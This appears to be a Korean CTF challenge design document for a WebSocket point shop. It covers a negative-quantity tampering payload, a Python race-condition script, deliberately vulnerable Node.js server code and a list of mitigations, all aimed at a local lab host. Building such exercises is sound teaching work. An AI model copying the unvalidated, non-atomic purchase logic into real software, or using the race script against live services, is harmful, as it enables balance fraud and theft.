---
title: WebSocket Message Tampering & Race Condition — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, websocket, race-condition, logic-bypass, concurrency]
confidence: high
---

# WebSocket Message Tampering & Race Condition — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Real-time Flag Exchange (실시간 플래그 거래소)
- **난이도**: Medium-High
- **핵심 컨셉**: 웹소켓(WebSocket) 프로토콜의 **상태 비저장성 검증 문제**와 **경쟁 조건(Race Condition)**을 동시에 공략해야 하는 결합형 문제입니다. 사용자는 모의 포인트 충전 및 상점을 이용해 아이템을 살 수 있으며, 상점에는 매우 비싼 플래그(`100,000 포인트`)가 올라와 있습니다. 초기 포인트는 `1,000 포인트`뿐이고, 일반적인 포인트 획득에는 한계가 있습니다. 공격자는 웹소켓 요청 패킷의 구조를 조작하고 동시 요청을 보내 잔고 상태 검증의 미흡한 틈을 타서 플래그를 구매해야 합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / WebSocket Client**: 웹소켓 접속 및 실시간 포인트 잔액, 상점 구매 내역 표시.
- **Backend Service (Node.js/Express with ws library)**:
  - 웹소켓 서버가 개별 클라이언트 커넥션(`ws`) 상태를 기반으로 이벤트를 수신하고 처리합니다.
  - 별도의 트랜잭션 격리수준(Transaction Isolation Level) 없이 간단한 전역/메모리 DB 객체 또는 취약한 데이터베이스 모델을 이용해 포인트를 조작합니다.
- **Flag 위치**:
  - 상점에서 `Flag` 아이템 구매 성공 시 웹소켓 응답 패킷 또는 구매 완료 영수증 내역에 포함됩니다.

### 2.2 취약점 지점
1. **WebSocket Message Tampering (Logic Bypass)**:
   - 구매 요청 메시지 파싱 중 수량(`quantity`) 필드에 대한 **음수(Negative Value)** 검증이 이루어지지 않아, 음수를 전달할 경우 포인트가 오히려 증가하는 비즈니스 로직 취약점이 발생할 수 있습니다.
2. **Race Condition (Concurrency)**:
   - 음수 수량 필터링이 구현되어 있더라도, 동일한 포인트 잔고 상황에서 동시에 여러 번의 구매 요청(동시성 요청)을 보냈을 때 비동기 로직의 지연(I/O, DB 조회 시간 등)으로 인해 잔액 한도 이상으로 다량의 구매가 완료되거나 잔고가 차감되지 않는 조건이 성립합니다.

---

## 3. 공격 면 (Attack Surface)

| 웹소켓 이벤트 (Action) | 전달 데이터 (Payload) | 반환 데이터 | 설명 |
|-----------------------|---------------------|------------|------|
| `CONNECT` | `ws://challenge.local/ws` | `{"event": "welcome", "balance": 1000}` | 연결 수립 및 잔고 전송 |
| `buy_item` | `{"action": "buy", "item": "flag", "quantity": 1}` | `{"event": "purchase_failed", "reason": "Insufficient balance"}` | 플래그 구매 시도 |
| `charge` | `{"action": "charge"}` | `{"event": "charged", "balance": 1100}` | 무료 소액 충전 (쿨다운 1분) |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 웹소켓 프레임 탐색
공격자는 브라우저 개발자 도구의 Network -> WS 탭 또는 Burp Suite의 WebSockets history를 통해 패킷을 확인합니다.
- *요청*: `{"action": "buy", "item": "potion", "quantity": 1}`
- *응답*: `{"event": "purchase_success", "item": "potion", "balance": 900}`

### Step 2. 웹소켓 메시지 변조 (음수 값 입력)
수량(`quantity`) 값에 음수나 비정상적인 큰 정수형 오버플로우를 테스트합니다.
- *변조 요청*: `{"action": "buy", "item": "potion", "quantity": -100}`
- *서버 연산 로직*: `balance = balance - (item.price * quantity)` => `balance = balance - (100 * -100)` = `balance + 10000`
- *결과*: 만약 백엔드에서 양수 검증을 누락했다면 포인트가 `10,900`으로 비정상 증가합니다. 이를 통해 플래그 가격만큼 포인트를 채우고 플래그를 구매합니다.

### Step 3. 경쟁 조건 공격 (Race Condition)
음수 검증이 막혀있을 경우, 보유 잔고를 소모하는 동시 구매 이벤트를 공략합니다. 예를 들어 잔고가 `1,000` 포인트이고 일반 아이템 `potion`이 `900` 포인트일 때, 이를 동시에 2번 구매하는 스크립트를 웹소켓으로 보냅니다.
- *공격 스크립트 작성 (Node.js/Python)*:
  동일한 웹소켓 세션 내에서 매우 짧은 시간차(밀리초 단위)로 여러 개의 `buy` 메시지를 동시에 전송합니다.
  ```python
  import asyncio
  import websockets
  import json

  async def trigger_race():
      uri = "ws://challenge.local/ws"
      async with websockets.connect(uri) as websocket:
          # 초기 환영 메시지 대기
          await websocket.recv()
          
          # 동시에 10개의 구매 요청을 보냄
          payload = json.dumps({"action": "buy", "item": "flag_part", "quantity": 1})
          tasks = [websocket.send(payload) for _ in range(10)]
          await asyncio.gather(*tasks)
          
          # 결과 출력 수신
          for _ in range(10):
              resp = await websocket.recv()
              print(resp)

  asyncio.run(trigger_race())
  ```
- *결과*: 서버가 `A` 요청의 잔고 조회를 수행하고, 잔고를 차감하여 저장하기 전에 `B` 요청의 잔고 조회를 수행하여 두 요청 모두 성공 처리됩니다. 이를 통해 시스템 잔고 제한을 뛰어넘는 이득을 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js)

```javascript
// server.js (WebSocket Handler 예시)
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

const items = {
    potion: 100,
    flag: 100000
};

// 모의 인메모리 세션 저장소
let userSession = {
    balance: 1000,
    inventory: []
};

wss.on('connection', (ws) => {
    ws.send(JSON.stringify({ event: 'welcome', balance: userSession.balance }));

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.action === 'buy') {
                const item = data.item;
                const qty = data.quantity; // 예: -100 또는 1

                if (!items[item]) {
                    return ws.send(JSON.stringify({ event: 'error', reason: 'Invalid item' }));
                }

                const price = items[item];
                const totalCost = price * qty;

                // 취약점 1: qty가 음수일 때 (qty < 0) 검증이 없음!
                // 취약점 2: 비동기 데이터베이스 조회/업데이트 간 격리 부재 (경쟁 조건 발생)
                // 아래의 지연 시간(setTimeout/DB 비동기 호출 시뮬레이션)으로 인해 레이스 컨디션 심화
                const currentBalance = await getBalanceFromDB(); 

                if (currentBalance >= totalCost) {
                    // 잔고가 임시 검증을 통과한 뒤, 일정 시간 지연 발생 시뮬레이션
                    await new Promise(resolve => setTimeout(resolve, 50)); 
                    
                    userSession.balance = currentBalance - totalCost;
                    userSession.inventory.push({ item, qty });
                    
                    let response = { event: 'purchase_success', balance: userSession.balance };
                    if (item === 'flag') {
                        response.flag = 'FLAG{w3bs0ck3t_r4c3_c0nd1t10n_succe$$}';
                    }
                    ws.send(JSON.stringify(response));
                } else {
                    ws.send(JSON.stringify({ event: 'purchase_failed', reason: 'Insufficient balance' }));
                }
            }
        } catch (e) {
            ws.send(JSON.stringify({ event: 'error', reason: 'Invalid payload format' }));
        }
    });
});

async function getBalanceFromDB() {
    // DB 비동기 조회 시뮬레이션
    return userSession.balance;
}
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **엄격한 양수 필터링 (Strict Positivity Checks)**:
   - 구매/주문 수량 등 정수 형식의 입력 값을 가질 때 항상 `quantity > 0`인지 체크합니다.
2. **원자적 연산 및 트랜잭션 락 (Atomic Operations & Transaction Lock)**:
   - 포인트 조회 및 차감은 원자적(Atomic) 연산으로 실행되어야 합니다. 데이터베이스 수준에서 `SELECT ... FOR UPDATE` 또는 낙관적/비관적 락(Lock)을 적용하여 동시 수정 시도를 차단해야 합니다.
3. **뮤텍스 / 세션별 락킹 (Mutex & Lock per Connection)**:
   - 개별 커넥션(또는 동일 사용자 ID)별로 웹소켓 이벤트 처리가 순차적으로 보장되도록 큐(Queue) 구조나 뮤텍스(Mutex) 기법을 사용해 하나의 처리가 완전히 끝난 후 다음 이벤트를 연산하도록 만듭니다.
